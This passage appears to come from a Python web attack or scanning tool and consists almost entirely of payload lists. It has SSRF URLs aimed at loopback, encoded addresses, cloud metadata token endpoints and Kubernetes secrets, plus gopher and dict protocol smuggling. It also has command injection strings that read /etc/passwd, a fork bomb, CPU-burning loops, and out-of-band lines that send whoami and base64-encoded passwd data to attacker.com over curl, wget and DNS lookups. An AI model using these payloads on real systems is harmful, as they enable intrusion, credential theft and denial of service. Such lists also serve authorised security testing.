        'http://%31%32%37%2e%30%2e%30%2e%31%36/',
        'http://%31%32%37%2e%30%2e%30%2e%31%37/',
        'http://%31%32%37%2e%30%2e%30%2e%31%38/',
        'http://%31%32%37%2e%30%2e%30%2e%31%39/',
        'http://%31%32%37%2e%30%2e%30%2e%32%30/',
        'http://%31%32%37%2e%30%2e%30%2e%32%31/',
        'http://%31%32%37%2e%30%2e%30%2e%32%32/',
        'http://%31%32%37%2e%30%2e%30%2e%32%33/',
        'http://%31%32%37%2e%30%2e%30%2e%32%34/',
        'http://%31%32%37%2e%30%2e%30%2e%32%35/',
        'http://%31%32%37%2e%30%2e%30%2e%32%36/',
        'http://%31%32%37%2e%30%2e%30%2e%32%37/',
        'http://%31%32%37%2e%30%2e%30%2e%32%38/',
        'http://%31%32%37%2e%30%2e%30%2e%32%39/',
        'http://%31%32%37%2e%30%2e%30%2e%33%30/',
        
        # ==================== 581-630: DOUBLE ENCODED ====================
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:80/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:8080/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:3000/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:5000/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:8000/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:9000/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:6379/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:9200/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:27017/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:5432/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:3306/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:11211/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:2181/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:9092/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:15672/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:5672/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:25/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:110/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:143/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:21/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:22/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:23/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:69/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:161/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:389/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:636/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:3268/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:3269/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531.nip.io/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2532/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2533/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2534/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2535/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2536/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2537/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2538/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2539/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2530/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2531/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2532/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2533/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2534/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2535/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2536/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2537/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2538/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2531%2539/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2532%2530/',
        'http://%2531%2532%2537%252e%2530%252e%2530%252e%2532%2531/',
        
        # ==================== 631-680: REDIRECT & PROTOCOL SMUGGLING ====================
        'http://0/',
        'http://0:80/',
        'http://0:8080/',
        'http://0:3000/',
        'http://0:5000/',
        'http://0:8000/',
        'http://0:9000/',
        'http://0:6379/',
        'http://0:9200/',
        'http://0:27017/',
        'http://0:5432/',
        'http://0:3306/',
        'http://0:11211/',
        'http://0:2181/',
        'http://0:9092/',
        'http://0:15672/',
        'http://0:5672/',
        'http://0:25/',
        'http://0:110/',
        'http://0:143/',
        'http://0:21/',
        'http://0:22/',
        'http://0:23/',
        'http://0:69/',
        'http://0:161/',
        'http://0:389/',
        'http://0:636/',
        'http://0:3268/',
        'http://0:3269/',
        'http://0.nip.io/',
        'http://0.0.0.0.nip.io/',
        'http://127.0.0.1/redirect?url=http://169.254.169.254/',
        'http://127.0.0.1/redirect?url=http://metadata.google.internal/',
        'http://127.0.0.1/redirect?url=file:///etc/passwd',
        'http://127.0.0.1/redirect?url=gopher://127.0.0.1:6379/_info',
        'http://127.0.0.1/redirect?url=dict://127.0.0.1:6379/info',
        'http://127.0.0.1/302?url=http://169.254.169.254/',
        'http://127.0.0.1/302?url=http://metadata.google.internal/',
        'http://127.0.0.1/302?url=file:///etc/passwd',
        'http://127.0.0.1/302?url=gopher://127.0.0.1:6379/_info',
        'http://127.0.0.1/302?url=dict://127.0.0.1:6379/info',
        'http://localhost/redirect?url=http://169.254.169.254/',
        'http://localhost/redirect?url=http://metadata.google.internal/',
        'http://localhost/redirect?url=file:///etc/passwd',
        'http://localhost/302?url=http://169.254.169.254/',
        'http://localhost/302?url=http://metadata.google.internal/',
        'http://localhost/302?url=file:///etc/passwd',
        'http://127.0.0.1/redir?to=http://169.254.169.254/',
        'http://127.0.0.1/redir?to=http://metadata.google.internal/',
        'http://127.0.0.1/redir?to=file:///etc/passwd',
        'http://127.0.0.1/?url=http://169.254.169.254/',
        'http://127.0.0.1/?url=http://metadata.google.internal/',
        'http://127.0.0.1/?url=file:///etc/passwd',
        
        # ==================== 681-730: URL WITH AUTH & QUERY PARAMS ====================
        'http://user:pass@127.0.0.1/',
        'http://user:pass@127.0.0.1:80/',
        'http://user:pass@127.0.0.1:8080/',
        'http://user:pass@127.0.0.1:3000/',
        'http://user:pass@127.0.0.1:5000/',
        'http://user:pass@127.0.0.1:8000/',
        'http://user:pass@127.0.0.1:9000/',
        'http://user:pass@127.0.0.1:6379/',
        'http://user:pass@127.0.0.1:9200/',
        'http://user:pass@127.0.0.1:27017/',
        'http://user:pass@127.0.0.1:5432/',
        'http://user:pass@127.0.0.1:3306/',
        'http://user:pass@localhost/',
        'http://user:pass@localhost:80/',
        'http://user:pass@localhost:8080/',
        'http://user:pass@localhost:3000/',
        'http://user:pass@0.0.0.0/',
        'http://user:pass@0.0.0.0:80/',
        'http://user:pass@0.0.0.0:8080/',
        'http://user:pass@[::1]/',
        'http://user:pass@[::1]:80/',
        'http://user:pass@[::1]:8080/',
        'http://127.0.0.1/?param=http://169.254.169.254/',
        'http://127.0.0.1/?url=http://169.254.169.254/&test=1',
        'http://127.0.0.1/?redirect=http://169.254.169.254/',
        'http://127.0.0.1/?next=http://169.254.169.254/',
        'http://127.0.0.1/?goto=http://169.254.169.254/',
        'http://127.0.0.1/?return=http://169.254.169.254/',
        'http://127.0.0.1/?return_to=http://169.254.169.254/',
        'http://127.0.0.1/?dest=http://169.254.169.254/',
        'http://127.0.0.1/?destination=http://169.254.169.254/',
        'http://127.0.0.1/?redirect_uri=http://169.254.169.254/',
        'http://127.0.0.1/?callback=http://169.254.169.254/',
        'http://127.0.0.1/?out=http://169.254.169.254/',
        'http://127.0.0.1/?view=http://169.254.169.254/',
        'http://127.0.0.1/?url=http://169.254.169.254/',
        'http://127.0.0.1/?r=http://169.254.169.254/',
        'http://127.0.0.1/?redir=http://169.254.169.254/',
        'http://127.0.0.1/?redirect=http://169.254.169.254/',
        'http://127.0.0.1/?path=http://169.254.169.254/',
        'http://127.0.0.1/?load=http://169.254.169.254/',
        'http://127.0.0.1/?fetch=http://169.254.169.254/',
        'http://127.0.0.1/?include=http://169.254.169.254/',
        'http://127.0.0.1/?format=http://169.254.169.254/',
        'http://127.0.0.1/?source=http://169.254.169.254/',
        'http://127.0.0.1/?path=http://169.254.169.254/',
        'http://127.0.0.1/?file=http://169.254.169.254/',
        'http://127.0.0.1/?download=http://169.254.169.254/',
        'http://127.0.0.1/?proxy=http://169.254.169.254/',
        'http://127.0.0.1/?api=http://169.254.169.254/',
        'http://127.0.0.1/?action=http://169.254.169.254/',
        
        # ==================== 731-780: HTTPS VARIATIONS ====================
        'https://127.0.0.1/',
        'https://127.0.0.1:443/',
        'https://127.0.0.1:8443/',
        'https://127.0.0.1:9443/',
        'https://127.0.0.1:6443/',
        'https://localhost/',
        'https://localhost:443/',
        'https://localhost:8443/',
        'https://0.0.0.0/',
        'https://[::1]/',
        'https://[::1]:443/',
        'https://[::1]:8443/',
        'https://169.254.169.254/',
        'https://metadata.google.internal/',
        'https://169.254.169.254/latest/meta-data/',
        'https://169.254.169.254/latest/user-data/',
        'https://metadata.google.internal/computeMetadata/v1/',
        'https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'https://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'https://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        'https://100.100.100.200/latest/meta-data/',
        'https://192.0.0.192/latest/meta-data/',
        'https://127.0.0.1.nip.io/',
        'https://localhost.nip.io/',
        'https://0.nip.io/',
        'https://0.0.0.0.nip.io/',
        'https://user:pass@127.0.0.1/',
        'https://user:pass@localhost/',
        'https://user:pass@0.0.0.0/',
        'https://user:pass@[::1]/',
        'https://%31%32%37%2e%30%2e%30%2e%31/',
        'https://%31%32%37%2e%30%2e%30%2e%31:443/',
        'https://%31%32%37%2e%30%2e%30%2e%31:8443/',
        'https://%2531%2532%2537%252e%2530%252e%2530%252e%2531/',
        'https://%2531%2532%2537%252e%2530%252e%2530%252e%2531:443/',
        'https://%2531%2532%2537%252e%2530%252e%2530%252e%2531:8443/',
        'https://0177.0.0.1/',
        'https://0x7f000001/',
        'https://2130706433/',
        'https://0/',
        'https://0:443/',
        'https://0:8443/',
        
        # ==================== 781-830: PORT SCANNING PAYLOADS ====================
        'http://127.0.0.1:1/',
        'http://127.0.0.1:2/',
        'http://127.0.0.1:3/',
        'http://127.0.0.1:4/',
        'http://127.0.0.1:5/',
        'http://127.0.0.1:6/',
        'http://127.0.0.1:7/',
        'http://127.0.0.1:8/',
        'http://127.0.0.1:9/',
        'http://127.0.0.1:10/',
        'http://127.0.0.1:11/',
        'http://127.0.0.1:12/',
        'http://127.0.0.1:13/',
        'http://127.0.0.1:14/',
        'http://127.0.0.1:15/',
        'http://127.0.0.1:16/',
        'http://127.0.0.1:17/',
        'http://127.0.0.1:18/',
        'http://127.0.0.1:19/',
        'http://127.0.0.1:20/',
        'http://127.0.0.1:21/',
        'http://127.0.0.1:22/',
        'http://127.0.0.1:23/',
        'http://127.0.0.1:24/',
        'http://127.0.0.1:25/',
        'http://127.0.0.1:26/',
        'http://127.0.0.1:27/',
        'http://127.0.0.1:28/',
        'http://127.0.0.1:29/',
        'http://127.0.0.1:30/',
        'http://127.0.0.1:31/',
        'http://127.0.0.1:32/',
        'http://127.0.0.1:33/',
        'http://127.0.0.1:34/',
        'http://127.0.0.1:35/',
        'http://127.0.0.1:36/',
        'http://127.0.0.1:37/',
        'http://127.0.0.1:38/',
        'http://127.0.0.1:39/',
        'http://127.0.0.1:40/',
        'http://127.0.0.1:41/',
        'http://127.0.0.1:42/',
        'http://127.0.0.1:43/',
        'http://127.0.0.1:44/',
        'http://127.0.0.1:45/',
        'http://127.0.0.1:46/',
        'http://127.0.0.1:47/',
        'http://127.0.0.1:48/',
        'http://127.0.0.1:49/',
        'http://127.0.0.1:50/',
        
        # ==================== 831-880: MORE PORT SCANNING ====================
        'http://127.0.0.1:53/',
        'http://127.0.0.1:67/',
        'http://127.0.0.1:68/',
        'http://127.0.0.1:69/',
        'http://127.0.0.1:123/',
        'http://127.0.0.1:135/',
        'http://127.0.0.1:137/',
        'http://127.0.0.1:138/',
        'http://127.0.0.1:139/',
        'http://127.0.0.1:161/',
        'http://127.0.0.1:162/',
        'http://127.0.0.1:389/',
        'http://127.0.0.1:443/',
        'http://127.0.0.1:445/',
        'http://127.0.0.1:465/',
        'http://127.0.0.1:514/',
        'http://127.0.0.1:515/',
        'http://127.0.0.1:546/',
        'http://127.0.0.1:547/',
        'http://127.0.0.1:554/',
        'http://127.0.0.1:587/',
        'http://127.0.0.1:631/',
        'http://127.0.0.1:636/',
        'http://127.0.0.1:646/',
        'http://127.0.0.1:873/',
        'http://127.0.0.1:990/',
        'http://127.0.0.1:993/',
        'http://127.0.0.1:995/',
        'http://127.0.0.1:1025/',
        'http://127.0.0.1:1026/',
        'http://127.0.0.1:1027/',
        'http://127.0.0.1:1028/',
        'http://127.0.0.1:1029/',
        'http://127.0.0.1:1030/',
        'http://127.0.0.1:1433/',
        'http://127.0.0.1:1434/',
        'http://127.0.0.1:1521/',
        'http://127.0.0.1:1723/',
        'http://127.0.0.1:1883/',
        'http://127.0.0.1:1900/',
        'http://127.0.0.1:2049/',
        'http://127.0.0.1:2082/',
        'http://127.0.0.1:2083/',
        'http://127.0.0.1:2086/',
        'http://127.0.0.1:2087/',
        'http://127.0.0.1:2095/',
        'http://127.0.0.1:2096/',
        'http://127.0.0.1:2222/',
        'http://127.0.0.1:2375/',
        'http://127.0.0.1:2376/',
        'http://127.0.0.1:2424/',
        'http://127.0.0.1:2425/',
        'http://127.0.0.1:2426/',
        'http://127.0.0.1:2427/',
        'http://127.0.0.1:2428/',
        'http://127.0.0.1:2429/',
        'http://127.0.0.1:2430/',
        'http://127.0.0.1:2480/',
        'http://127.0.0.1:2601/',
        'http://127.0.0.1:2602/',
        'http://127.0.0.1:2603/',
        'http://127.0.0.1:2604/',
        'http://127.0.0.1:2605/',
        'http://127.0.0.1:2606/',
        'http://127.0.0.1:2607/',
        'http://127.0.0.1:2608/',
        'http://127.0.0.1:2609/',
        'http://127.0.0.1:2610/',
        'http://127.0.0.1:2710/',
        'http://127.0.0.1:2711/',
        'http://127.0.0.1:2712/',
        'http://127.0.0.1:2713/',
        'http://127.0.0.1:2714/',
        'http://127.0.0.1:2715/',
        'http://127.0.0.1:2716/',
        'http://127.0.0.1:2717/',
        'http://127.0.0.1:2718/',
        'http://127.0.0.1:2719/',
        'http://127.0.0.1:2720/',
        
        # ==================== 881-930: KUBERNETES & DOCKER ====================
        'http://127.0.0.1:10250/',
        'http://127.0.0.1:10250/pods',
        'http://127.0.0.1:10255/',
        'http://127.0.0.1:10255/pods',
        'http://127.0.0.1:10256/',
        'http://127.0.0.1:10257/',
        'http://127.0.0.1:10259/',
        'http://127.0.0.1:2379/',
        'http://127.0.0.1:2379/version',
        'http://127.0.0.1:2379/health',
        'http://127.0.0.1:2380/',
        'http://127.0.0.1:2381/',
        'http://127.0.0.1:2382/',
        'http://127.0.0.1:6443/',
        'http://127.0.0.1:6443/api/v1/',
        'http://127.0.0.1:6443/api/v1/namespaces/default/pods',
        'http://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets',
        'http://127.0.0.1:6443/api/v1/namespaces/kube-system/configmaps',
        'http://127.0.0.1:8443/',
        'http://127.0.0.1:8443/api/v1/',
        'http://127.0.0.1:10248/',
        'http://127.0.0.1:10249/',
        'http://127.0.0.1:10250/metrics',
        'http://127.0.0.1:10251/',
        'http://127.0.0.1:10252/',
        'http://127.0.0.1:10253/',
        'http://127.0.0.1:10254/',
        'http://127.0.0.1:10256/metrics',
        'http://127.0.0.1:4242/',
        'http://127.0.0.1:4243/',
        'http://127.0.0.1:4244/',
        'http://127.0.0.1:4245/',
        'http://127.0.0.1:4246/',
        'http://127.0.0.1:4247/',
        'http://127.0.0.1:4248/',
        'http://127.0.0.1:4249/',
        'http://127.0.0.1:4250/',
        'http://127.0.0.1:4251/',
        'http://127.0.0.1:4252/',
        'http://127.0.0.1:4253/',
        'http://127.0.0.1:4254/',
        'http://127.0.0.1:4255/',
        'http://127.0.0.1:4256/',
        'http://127.0.0.1:4257/',
        'http://127.0.0.1:4258/',
        'http://127.0.0.1:4259/',
        'http://127.0.0.1:4260/',
        'http://127.0.0.1:4261/',
        'http://127.0.0.1:4262/',
        'http://127.0.0.1:4263/',
        'http://127.0.0.1:4264/',
        'http://127.0.0.1:4265/',
        
        # ==================== 931-980: ELASTICSEARCH & KIBANA ====================
        'http://127.0.0.1:9200/',
        'http://127.0.0.1:9200/_cat',
        'http://127.0.0.1:9200/_cat/indices',
        'http://127.0.0.1:9200/_cat/nodes',
        'http://127.0.0.1:9200/_cat/health',
        'http://127.0.0.1:9200/_cat/master',
        'http://127.0.0.1:9200/_cat/plugins',
        'http://127.0.0.1:9200/_cat/thread_pool',
        'http://127.0.0.1:9200/_cluster/health',
        'http://127.0.0.1:9200/_cluster/state',
        'http://127.0.0.1:9200/_cluster/stats',
        'http://127.0.0.1:9200/_nodes',
        'http://127.0.0.1:9200/_nodes/stats',
        'http://127.0.0.1:9200/_nodes/process',
        'http://127.0.0.1:9200/_nodes/jvm',
        'http://127.0.0.1:9200/_nodes/os',
        'http://127.0.0.1:9200/_nodes/fs',
        'http://127.0.0.1:9200/_nodes/network',
        'http://127.0.0.1:9200/_nodes/transport',
        'http://127.0.0.1:9200/_nodes/http',
        'http://127.0.0.1:9200/_nodes/ingest',
        'http://127.0.0.1:9200/_nodes/thread_pool',
        'http://127.0.0.1:9200/_nodes/plugins',
        'http://127.0.0.1:9200/_stats',
        'http://127.0.0.1:9200/_all/_search',
        'http://127.0.0.1:9200/_search?q=*:*',
        'http://127.0.0.1:9200/_search?pretty=true',
        'http://127.0.0.1:9200/_msearch',
        'http://127.0.0.1:9200/_aliases',
        'http://127.0.0.1:9200/_snapshot',
        'http://127.0.0.1:9200/_tasks',
        'http://127.0.0.1:9200/_tasks?detailed=true',
        'http://127.0.0.1:9200/_xpack',
        'http://127.0.0.1:9200/_xpack/security/user',
        'http://127.0.0.1:9200/_xpack/security/role',
        'http://127.0.0.1:9200/_xpack/security/privilege',
        'http://127.0.0.1:9200/_xpack/license',
        'http://127.0.0.1:5601/',
        'http://127.0.0.1:5601/api/status',
        'http://127.0.0.1:5601/api/saved_objects',
        'http://127.0.0.1:5601/api/saved_objects/_find',
        'http://127.0.0.1:5601/api/saved_objects/index-pattern',
        'http://127.0.0.1:5601/api/saved_objects/dashboard',
        'http://127.0.0.1:5601/api/saved_objects/visualization',
        'http://127.0.0.1:5601/api/saved_objects/search',
        'http://127.0.0.1:5601/api/saved_objects/config',
        'http://127.0.0.1:5601/api/saved_objects/url',
        'http://127.0.0.1:5601/api/saved_objects/tag',
        'http://127.0.0.1:5601/api/console/proxy',
        'http://127.0.0.1:5601/api/console/api_server',
        'http://127.0.0.1:5601/api/security/v1/users',
        'http://127.0.0.1:5601/api/security/v1/roles',
        'http://127.0.0.1:5601/api/security/v1/privileges',
        
        # ==================== 981-1000: FINAL COVERAGE ====================
        'http://localhost.localdomain/',
        'http://localhost.localdomain:80/',
        'http://localhost.localdomain:8080/',
        'http://local.host/',
        'http://local.host:80/',
        'http://local.host:8080/',
        'http://intranet/',
        'http://intranet:80/',
        'http://intranet:8080/',
        'http://internal/',
        'http://internal:80/',
        'http://internal:8080/',
        'http://private/',
        'http://private:80/',
        'http://private:8080/',
        'http://corporate/',
        'http://corporate:80/',
        'http://corporate:8080/',
        'http://172.0.0.1/',
        'http://192.0.0.1/',
        'http://169.254.0.1/',
        'http://169.254.0.2/',
        'http://169.254.0.3/',
        'http://169.254.0.4/',
        'http://169.254.0.5/',
        'http://169.254.0.6/',
        'http://169.254.0.7/',
        'http://169.254.0.8/',
        'http://169.254.0.9/',
        'http://169.254.0.10/',
        'http://169.254.0.11/',
        'http://169.254.0.12/',
        'http://169.254.0.13/',
        'http://169.254.0.14/',
        'http://169.254.0.15/',
        'http://169.254.0.16/',
        'http://169.254.0.17/',
        'http://169.254.0.18/',
        'http://169.254.0.19/',
        'http://169.254.0.20/',
    ]
    
    # ─── Command Injection Payloads — 40+ vectors ─────────────────────────
    CMDI_PAYLOADS = [
        # ==================== 1-50: BASIC COMMAND SEPARATORS ====================
        ('; id', 'Semicolon Basic'),
        ('; whoami', 'Semicolon Whoami'),
        ('; ls', 'Semicolon LS'),
        ('; cat /etc/passwd', 'Semicolon Cat'),
        ('; pwd', 'Semicolon PWD'),
        ('; hostname', 'Semicolon Hostname'),
        ('; uname -a', 'Semicolon Uname'),
        ('; env', 'Semicolon Env'),
        ('; ps aux', 'Semicolon PS'),
        ('; netstat -an', 'Semicolon Netstat'),
        ('| id', 'Pipe Basic'),
        ('| whoami', 'Pipe Whoami'),
        ('| ls', 'Pipe LS'),
        ('| cat /etc/passwd', 'Pipe Cat'),
        ('| pwd', 'Pipe PWD'),
        ('| hostname', 'Pipe Hostname'),
        ('| uname -a', 'Pipe Uname'),
        ('| env', 'Pipe Env'),
        ('|| id', 'Double Pipe Basic'),
        ('|| whoami', 'Double Pipe Whoami'),
        ('|| ls', 'Double Pipe LS'),
        ('|| cat /etc/passwd', 'Double Pipe Cat'),
        ('& id', 'Ampersand Basic'),
        ('& whoami', 'Ampersand Whoami'),
        ('& ls', 'Ampersand LS'),
        ('& cat /etc/passwd', 'Ampersand Cat'),
        ('&& id', 'Double Amps Basic'),
        ('&& whoami', 'Double Amps Whoami'),
        ('&& ls', 'Double Amps LS'),
        ('&& cat /etc/passwd', 'Double Amps Cat'),
        ('\n id', 'Newline Basic'),
        ('\n whoami', 'Newline Whoami'),
        ('\n ls', 'Newline LS'),
        ('\n cat /etc/passwd', 'Newline Cat'),
        ('%0a id', 'URL Newline Basic'),
        ('%0a whoami', 'URL Newline Whoami'),
        ('%0a ls', 'URL Newline LS'),
        ('%0a cat /etc/passwd', 'URL Newline Cat'),
        ('%0d%0a id', 'CRLF Basic'),
        ('%0d%0a whoami', 'CRLF Whoami'),
        ('%0d%0a ls', 'CRLF LS'),
        ('%0d%0a cat /etc/passwd', 'CRLF Cat'),
        ('%3b id', 'URL Semi Basic'),
        ('%3b whoami', 'URL Semi Whoami'),
        ('%3b ls', 'URL Semi LS'),
        ('%3b cat /etc/passwd', 'URL Semi Cat'),
        ('%7c id', 'URL Pipe Basic'),
        ('%7c whoami', 'URL Pipe Whoami'),
        ('%7c ls', 'URL Pipe LS'),
        ('%7c cat /etc/passwd', 'URL Pipe Cat'),
        
        # ==================== 51-100: SUBSHELL ====================
        ('`id`', 'Backticks Basic'),
        ('`whoami`', 'Backticks Whoami'),
        ('`ls`', 'Backticks LS'),
        ('`cat /etc/passwd`', 'Backticks Cat'),
        ('`pwd`', 'Backticks PWD'),
        ('`hostname`', 'Backticks Hostname'),
        ('`uname -a`', 'Backticks Uname'),
        ('`env`', 'Backticks Env'),
        ('`ps aux`', 'Backticks PS'),
        ('`netstat -an`', 'Backticks Netstat'),
        ('$(id)', 'Dollar Sub Basic'),
        ('$(whoami)', 'Dollar Sub Whoami'),
        ('$(ls)', 'Dollar Sub LS'),
        ('$(cat /etc/passwd)', 'Dollar Sub Cat'),
        ('$(pwd)', 'Dollar Sub PWD'),
        ('$(hostname)', 'Dollar Sub Hostname'),
        ('$(uname -a)', 'Dollar Sub Uname'),
        ('$(env)', 'Dollar Sub Env'),
        ('$(ps aux)', 'Dollar Sub PS'),
        ('$(netstat -an)', 'Dollar Sub Netstat'),
        ('{id}', 'Curly Brace'),
        ('{whoami}', 'Curly Brace Whoami'),
        ('{ls}', 'Curly Brace LS'),
        ('{cat,/etc/passwd}', 'Curly Brace Cat'),
        ('${IFS}id', 'IFS Variable'),
        ('${IFS}whoami', 'IFS Whoami'),
        ('${IFS}ls', 'IFS LS'),
        ('${IFS}cat${IFS}/etc/passwd', 'IFS Cat'),
        ('${PATH%%??}id', 'PATH Substitution'),
        ('${PATH%%??}whoami', 'PATH Whoami'),
        ('${PATH%%??}ls', 'PATH LS'),
        ('${PATH%%??}cat${PATH%%??}/etc/passwd', 'PATH Cat'),
        ('$(echo id)', 'Echo Sub'),
        ('$(echo whoami)', 'Echo Whoami'),
        ('$(echo ls)', 'Echo LS'),
        ('$(echo cat /etc/passwd)', 'Echo Cat'),
        ('`echo id`', 'Echo Backticks'),
        ('`echo whoami`', 'Echo Backticks Whoami'),
        ('`echo ls`', 'Echo Backticks LS'),
        ('`echo cat /etc/passwd`', 'Echo Backticks Cat'),
        ('$({id})', 'Braced Sub'),
        ('$({whoami})', 'Braced Whoami'),
        ('$({ls})', 'Braced LS'),
        ('$({cat /etc/passwd})', 'Braced Cat'),
        ('$(printf id)', 'Printf Sub'),
        ('$(printf whoami)', 'Printf Whoami'),
        ('$(printf ls)', 'Printf LS'),
        ('$(printf "cat /etc/passwd")', 'Printf Cat'),
        ('`printf id`', 'Printf Backticks'),
        ('`printf whoami`', 'Printf Backticks Whoami'),
        
        # ==================== 101-150: TIME-BASED / BLIND ====================
        ('; sleep 1', 'Sleep 1s'),
        ('; sleep 3', 'Sleep 3s'),
        ('; sleep 5', 'Sleep 5s'),
        ('; sleep 10', 'Sleep 10s'),
        ('; sleep 30', 'Sleep 30s'),
        ('; sleep 60', 'Sleep 60s'),
        ('| sleep 1', 'Pipe Sleep 1'),
        ('| sleep 3', 'Pipe Sleep 3'),
        ('| sleep 5', 'Pipe Sleep 5'),
        ('| sleep 10', 'Pipe Sleep 10'),
        ('|| sleep 3', 'Double Pipe Sleep'),
        ('& sleep 3', 'Amp Sleep'),
        ('&& sleep 3', 'Double Amp Sleep'),
        ('\n sleep 3', 'Newline Sleep'),
        ('%0a sleep 3', 'URL Sleep'),
        ('`sleep 3`', 'Backticks Sleep'),
        ('$(sleep 3)', 'Dollar Sleep'),
        ('; ping -c 1 127.0.0.1', 'Ping Local 1'),
        ('; ping -c 3 127.0.0.1', 'Ping Local 3'),
        ('; ping -c 10 127.0.0.1', 'Ping Local 10'),
        ('; ping -n 1 127.0.0.1', 'Windows Ping'),
        ('; ping -n 3 127.0.0.1', 'Windows Ping 3'),
        ('; timeout 3', 'Timeout'),
        ('| timeout 3', 'Pipe Timeout'),
        ('; timeout /t 3', 'Windows Timeout'),
        ('; sleep 3 && echo done', 'Sleep Echo'),
        ('; ping -c 3 127.0.0.1 && echo done', 'Ping Echo'),
        ('; for i in 1 2 3; do echo test; done', 'Loop Echo'),
        ('; while true; do echo test; sleep 1; done', 'Infinite Loop'),
        ('; yes > /dev/null', 'Yes CPU Burn'),
        ('; dd if=/dev/zero of=/dev/null &', 'DD CPU Burn'),
        ('; :(){ :|:& };:', 'Fork Bomb'),
        ('; perl -e "sleep(3)"', 'Perl Sleep'),
        ('; python -c "import time; time.sleep(3)"', 'Python Sleep'),
        ('; php -r "sleep(3);"', 'PHP Sleep'),
        ('; ruby -e "sleep(3)"', 'Ruby Sleep'),
        ('; node -e "setTimeout(()=>{},3000)"', 'Node Sleep'),
        ('; java -version && sleep 3', 'Java Sleep'),
        ('; curl --max-time 3 http://127.0.0.1', 'Curl Timeout'),
        ('; wget --timeout=3 http://127.0.0.1', 'Wget Timeout'),
        ('; read -t 3', 'Read Timeout'),
        ('; select i in 1 2 3; do break; done', 'Select Loop'),
        ('; trap "echo test" EXIT; sleep 3', 'Trap Sleep'),
        ('; (sleep 3)', 'Subshell Sleep'),
        ('; { sleep 3; }', 'Braced Sleep'),
        ('; sleep 3 | sleep 3', 'Pipe Sleep Chain'),
        ('; sleep 3 && sleep 3', 'And Sleep Chain'),
        ('; sleep 3 || echo fail', 'Or Sleep'),
        ('; sleep 3; echo done', 'Semicolon Chain'),
        
        # ==================== 151-200: OUT-OF-BAND (DNS/HTTP) ====================
        ('; curl http://attacker.com/', 'Curl Basic'),
        ('; curl http://attacker.com/$(whoami)', 'Curl OOB Whoami'),
        ('; curl http://attacker.com/$(id)', 'Curl OOB ID'),
        ('; curl http://attacker.com/$(cat /etc/passwd | base64)', 'Curl OOB Passwd'),
        ('; curl http://attacker.com/?c=$(whoami)', 'Curl Query OOB'),
        ('; curl --data "$(whoami)" http://attacker.com/', 'Curl POST OOB'),
        ('| curl http://attacker.com/', 'Pipe Curl'),
        ('|| curl http://attacker.com/', 'Double Pipe Curl'),
        ('& curl http://attacker.com/', 'Amp Curl'),
        ('&& curl http://attacker.com/', 'Double Amp Curl'),
        ('; wget http://attacker.com/$(whoami)', 'Wget OOB'),
        ('; wget --post-data="$(whoami)" http://attacker.com/', 'Wget POST'),
        ('; nslookup attacker.com', 'NSLookup Basic'),
        ('; nslookup $(whoami).attacker.com', 'DNS OOB Whoami'),
        ('; nslookup $(id).attacker.com', 'DNS OOB ID'),
        ('; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com', 'DNS OOB Passwd'),
        ('; dig attacker.com', 'Dig Basic'),
        ('; dig $(whoami).attacker.com', 'Dig OOB'),
        ('; host attacker.com', 'Host Basic'),
        ('; host $(whoami).attacker.com', 'Host OOB'),
        ('; ping -c 1 attacker.com', 'Ping OOB Basic'),
